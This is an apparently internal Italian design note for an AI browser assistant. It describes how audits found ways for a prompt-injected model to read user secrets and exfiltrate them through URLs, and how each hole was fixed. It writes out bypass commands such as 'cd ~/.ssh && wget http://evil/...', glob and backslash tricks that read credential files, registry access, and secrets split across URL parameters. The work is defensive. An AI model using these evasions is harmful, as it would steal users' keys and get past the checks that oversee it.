# Un confine che l'agente può spostare da solo non è un confine

[← Tutti i pattern](../PATTERNS.md)

Le difese di Filo contro un modello pilotato da una pagina ostile si agganciano
a qualcosa. Il pattern è su **cosa**: se quel qualcosa lo può cambiare l'agente
stesso, o lo sceglie chi attacca, la difesa esiste solo sulla carta.

Due casi veri, tutti e due trovati nell'audit #587, tutti e due sulla stessa
catena: pagina ostile → il modello legge un file dell'utente → il modello apre
`https://sito/?d=<contenuto>`.

## Caso 1 — il perimetro agganciato alla cartella di lavoro

Il freno naturale su «quali file può leggere senza chiedere» è la cartella di
lavoro: dentro sì, fuori chiedi. Non funziona, perché **`cd` è livello 1**: non
legge niente, quindi non ha motivo di chiedere conferma, ed è la primitiva di
navigazione dell'agente (pretendere un OK a ogni spostamento la rende
inutilizzabile). Ma allora `cd /etc && cat passwd` sposta il perimetro e poi ci
legge dentro, con due comandi che uno per uno sono innocui. È la stessa forma
del #479, dove `cd ~/.ssh && wget http://evil/authorized_keys` faceva atterrare
un file esattamente dove `wget -O ~/.ssh/authorized_keys` chiedeva di digitare
«conferma».

La cura è **dichiarare il perimetro fuori dalla portata dell'agente**: in
`src/shared/cmdClassify.js` è `perimetro`, che il main riempie con la cartella da
cui l'assistente PARTE (la home), non con quella dove si trova adesso. La
cartella corrente serve solo a risolvere i percorsi relativi, e i `cd` dentro una
sequenza si SEGUONO, così `cat passwd` dopo un `cd /etc` viene misurato in
`/etc`. Fra un turno e l'altro la cartella vera la passa il main, quindi
concatenare o spezzare in due turni dà lo stesso esito.

Corollario: siccome il perimetro dichiarato è la home, «dentro il perimetro» non
può bastare. I **bersagli riservati** (`.ssh`, `.aws`, `.env`,
`.git-credentials`, `AppData`, le cronologie della shell) non sono livello 1
nemmeno lì, e l'ambiente (`printenv`, `$env:`, `%APPDATA%`) non lo è mai: una
variabile nasconde al classificatore il file vero che il comando aprirà.

## Caso 2 — la fiducia agganciata al mittente

Il ripiego strutturale dell'anti-esfiltrazione (`src/shared/urlExfil.js`) si
accendeva solo `fromUntrusted`, e `fromUntrusted` guardava **l'origine del
mittente del messaggio**. La chat della home è `filo://`, cioè fidata: il ripiego
non si accendeva mai, nemmeno con mezza pagina ostile davanti al modello. Chi
manda il messaggio non dice niente su cosa il modello ha in testa.

La cura è misurare **cosa è entrato nel contesto**, non chi ha parlato:
`src/main/services/contextTaint.js` registra il materiale non fidato mentre entra
(output dei comandi, risultati di ricerca, documenti aperti dal disco) e lo tiene
appeso al webContents della scheda, che vive quanto la conversazione. L'origine
`http(s)` resta una delle sorgenti, non più l'unica.

Lo stesso registro risolve l'altra metà del buco: il corpus su cui si fa il
taint-match conteneva solo i dati persistenti (memoria, profilo, appunti), quindi
un file appena letto con `cat` non c'era e l'indirizzo che ne riportava fuori un
pezzo passava come livello 1. Quello che il modello ha appena letto è esattamente
quello che una pagina ostile gli chiederà di riscrivere in un URL: se entra nel
contesto, entra nel corpus.

## Caso 3 — il bersaglio letto nel testo invece che nel percorso vero

Il perimetro del caso 1 era dichiarato bene, e il confronto col perimetro girava
già sul percorso RISOLTO. Ma il corollario — i bersagli riservati dentro la home
— leggeva ancora il **testo dell'operando**. Basta che quella parola non ci sia:

- `cd ~/.ssh && cat config` — nessun comando nomina `.ssh` mentre legge, e
  `config` da solo non è in lista. Stessa cosa con `authorized_keys`,
  `~/.gnupg/secring.gpg`, e soprattutto `~/.config/Filo/storage.json`, dove
  stanno le chiavi API e il portafoglio dell'utente. Scritto per intero
  (`cat .config/Filo/storage.json`) lo stesso identico file chiedeva un OK.
- `grep -r chiave .` dalla home non nomina **niente**: il bersaglio è un
  sottoalbero, e ci passa dentro tutto.
- `ls` dopo un `cd /etc` non nomina niente nemmeno lui: il bersaglio è la
  cartella corrente.

La cura è una sola regola, applicata in tre punti di `readReason`: **il bersaglio
è quello che il comando aprirà**. I bersagli riservati si cercano anche nel
percorso risolto; un comando senza percorso si misura sulla cartella corrente;
una lettura ricorsiva si misura sul sottoalbero, e se il sottoalbero è la
cartella dichiarata chiede un OK (su una sottocartella no, altrimenti cercare nel
proprio lavoro costerebbe una conferma).

## Caso 4 — l'avviso che compare sempre

L'altra faccia, ed è una falla di sicurezza quanto le altre. Il ripiego
strutturale del caso 2 si accende adesso anche nella chat della home, e con due
sviste è arrivato a scattare su quasi ogni link vero:

- i risultati di una ricerca finivano fra i **dati da proteggere**. Sono testo
  pubblico, e dentro ci sono gli indirizzi dei risultati: «cerca la carbonara e
  aprimi il primo» faceva combaciare il link con se stesso e apriva un avviso di
  furto di dati. Marcare il contesto come pilotabile e proteggere il contenuto
  sono **due domande diverse**: la ricerca risponde sì alla prima e no alla
  seconda, e la risposta la tiene `contextTaint` per provenienza, non ogni
  chiamante;
- il ripiego contava i caratteri senza guardare se si leggessero come parole, e
  i separatori umani (`/`, `-`, `_`, `+`) restavano dentro il conteggio:
  `/wiki/Storia_della_matematica` passava per «un blocco di dati codificato».

Una conferma che compare su ogni link si clicca senza leggerla. A quel punto la
difesa non c'è più, e in cambio si è pagato l'attrito: **un falso allarme sul
cammino principale costa più di quanto rendeva l'allarme**.

## Caso 5 — il testo del comando non è ancora il bersaglio

Il caso 3 aveva spostato la misura dal testo dell'operando al percorso risolto.
Non basta: fra il testo e il file che si apre ci sono altri due passaggi, e tutti
e due li fa qualcun altro dopo che il livello è già stato deciso.

- **La shell espande i modelli.** `cat .*` non nomina niente di riservato e apre
  `.netrc`, `.git-credentials`, `.pgpass` e la cronologia della shell; `cat .s?h/*`
  apre la chiave privata; `cd .s?h && cat config` aggira il caso 3 riscrivendone
  il bersaglio con un punto interrogativo. Vale con ogni programma che legge, con
  le graffe (`cat .{netrc,pgpass}`), su Windows (`AppDat?`), dentro una pipeline.
  Un modello pretende la domanda **opposta** a quella di un nome: non «è
  riservato?» ma «**può prenderne uno**?» (`modelloPrendeRiservato`, che traduce
  il modello in un'espressione regolare e la prova contro l'elenco dei nomi).
- **Il filesystem segue i collegamenti.** `scorciatoia/config` non porta addosso
  il nome `.ssh`. Il classificatore vive in `shared/` e non ha filesystem: il
  percorso vero glielo passa il main (`setRealPath`, montato in
  `src/main/services/loader.js`). Una **copia** invece è un file nuovo davvero, e
  nessun controllo può riconoscerla dopo: perciò copiare, spostare o collegare un
  bersaglio riservato è salito a livello 3 — il prezzo si paga prima, quando la
  cosa è ancora riconoscibile.

Corollario del caso 4, che qui torna: la cura non può essere «nel dubbio chiedi».
Un modello è anche il modo normale di lavorare sui propri file, e `cat *.txt`
deve restare gratis; un modello che prende tutto quello che c'è lì (`*`, `*.*`)
non allarga niente rispetto alla cartella in cui sta, quindi si misura come
quella. E la simmetria opposta: il **primo operando di una ricerca è il testo
cercato, non un file** — misurarlo faceva chiedere un OK a chi cercava la parola
«credentials» nei propri appunti, spiegandolo per giunta con una frase falsa.

## Caso 6 — la soglia tarata sul nulla

Sempre il caso 4, un giro dopo. Tolto il conteggio dei caratteri leggibili, il
ripiego strutturale guardava ancora un tratto illeggibile qualsiasi lungo 24
caratteri — cioè l'identificativo che **ogni** sito mette nei suoi indirizzi. Su
venti link veri ne fermava otto: un documento di Google, una scheda di Amazon, un
brano di Spotify, un post su X, un articolo del Corriere.

Quando una soglia separa «normale» da «sospetto», va **misurata sul normale**,
non scelta a mente: il pezzo illeggibile più lungo che un sito vero usa è
l'identificativo di un documento di Google, 44 caratteri. E dove una soglia non
basta, si cerca un segnale di qualità invece che di quantità: un blocco che **si
riapre come testo** non è il modo in cui un sito nomina le sue cose — nessuno dei
venti indirizzi veri si riapre, e un payload impacchettato sì.

## Caso 7 — il bersaglio letto con la grammatica sbagliata

Il caso 5 aveva spostato la misura sul percorso che il comando aprirà davvero,
espansione dei modelli e collegamenti compresi. Restava un passaggio prima
ancora: **chi scioglie il testo del comando è la shell**, e il classificatore
leggeva tutto con la grammatica di Windows.

- **La barra rovesciata non vuol dire la stessa cosa dappertutto.** Su Windows
  separa le cartelle; in bash — la shell di Filo su Mac e Linux — annulla il
  carattere che segue. `cat .ss\h/config` apre `~/.ssh/config`, `cat .netr\c`
  apre `~/.netrc`, `cat .confi\g/Filo/storage.json` apre il file con le chiavi
  API: il controllo vedeva due segmenti innocui e lasciava passare. Stessa cosa
  per `$'…'`, che in bash è solo un altro modo di scrivere la stessa stringa.
  Quale shell eseguirà il comando lo sa **il main**, che lo dichiara come tutto
  il resto del perimetro (`_shell`). Senza dichiarazione si misurano entrambe le
  letture, ma quella alternativa vota **solo sui bersagli riservati e mai sul
  perimetro**: se votasse anche lì, un percorso Windows normalissimo
  (`C:\Users\mario\note.txt`, che sciolto diventa una parola sola) risulterebbe
  fuori dalla cartella dell'utente e ogni lettura chiederebbe un OK — il caso 4
  che rientra dalla finestra.
- **Un percorso può viaggiare attaccato al nome di un'opzione.** PowerShell lega
  i parametri anche coi due punti (`Get-Content -Path:.ssh\config`, e accetta le
  abbreviazioni: `-Pa:`, `-P:`), Unix con l'uguale o incollato (`--file=…`,
  `-f…`). Scartare ogni token che inizia con un trattino significa non misurare
  affatto quel percorso. La simmetria del caso 5 vale anche qui: il valore di
  un'opzione che porta un **modello da cercare** (`-e`, `--regexp`, `-Pattern`,
  `/C:`) non è un file, e nemmeno il token che segue.
- **Un "drive" di PowerShell non è una cartella.** `HKCU:`/`HKLM:` sono il
  registro di sistema, dove diversi programmi tengono le password salvate;
  `Cert:`, `Variable:`, `Function:` altre parti interne. Venivano risolti come
  una cartella relativa dentro la home e passavano senza chiedere niente.

## Caso 8 — il dato tagliato in due

L'altro anello, con la stessa forma: chi compone l'indirizzo è la pagina ostile
che detta al modello cosa aprire, quindi **il formato del payload lo sceglie chi
attacca**. Il confronto col materiale letto funzionava in chiaro, in base64, nel
sottodominio e dentro il percorso, e si svuotava con una riga: tagliare il dato
in due e rimetterlo in due parametri (`?a=Segreto&b=Netrc2026`). In mezzo ci
finisce il nome del secondo parametro, il confronto non trova più niente, e i
pezzi presi da soli si leggono come parole, quindi nemmeno il ripiego
strutturale dice niente.

Due cure, tutte e due in `src/shared/urlExfil.js`: si confrontano anche i **soli
valori incollati** (senza nomi di parametri né separatori), che rimettono insieme
il dato tagliato — e con lui un base64 spezzato a metà; e per la spazzatura
infilata **dentro** un valore il confronto tollera un dato lungo ritrovato in due
o tre tronconi, ognuno abbastanza lungo da non essere un caso. Le misure restano
strette per il motivo del caso 4: un avviso falso sul cammino principale costa
più di quanto rende.

Quello che resta fuori è dichiarato, non dimenticato: un dato **cifrato o in
esadecimale** non lo riconosce nessun confronto: lì la difesa è il ripiego
strutturale, che guarda quanta roba illeggibile porta il link.

## Regola operativa

Quando aggiungi una difesa, scrivi accanto **a cosa è agganciata** e chiediti chi
può cambiare quel valore. Se la risposta è «l'agente, con un'azione che non
chiede niente» o «la pagina», l'aggancio è sbagliato: spostalo su qualcosa che
decide il main e che l'LLM non può toccare (in `executeFiloAction` i campi
iniettati prima del gate hanno il prefisso `_` e vengono sovrascritti sempre,
proprio perché un valore che arrivasse dal modello non deve poter allargare
niente).

E cerca la **strada equivalente** prima di consegnare: chiudere il terminale e
lasciare `LEGGI_DOCUMENTO` a livello 1 avrebbe solo spostato la porta, visto che
quell'azione apre dal disco gli stessi file. Due strade per la stessa cosa hanno
lo stesso livello, oppure la più economica è l'unica che verrà usata.

## Dove guardare

- `src/shared/cmdClassify.js` — `perimetro`, `readReason`, `pathReason`.
- `src/main/services/contextTaint.js` — il registro del materiale non fidato.
- `src/main/services/handlers.js` — `navExfilCorpus`, l'iniezione di
  `_perimetro`/`_cwdReale`/`_shell`/`_motivoPerimetro` prima del gate dei livelli.
- `src/shared/urlExfil.js` — `valoriUniti` e `combaciaSpezzato` (il dato tagliato
  dentro l'indirizzo), le soglie del ripiego strutturale.
- `tests/unit/cmdClassify.test.mjs`, `tests/unit/contextTaint.test.mjs`,
  `tests/filo-naviga-exfil.spec.mjs`.
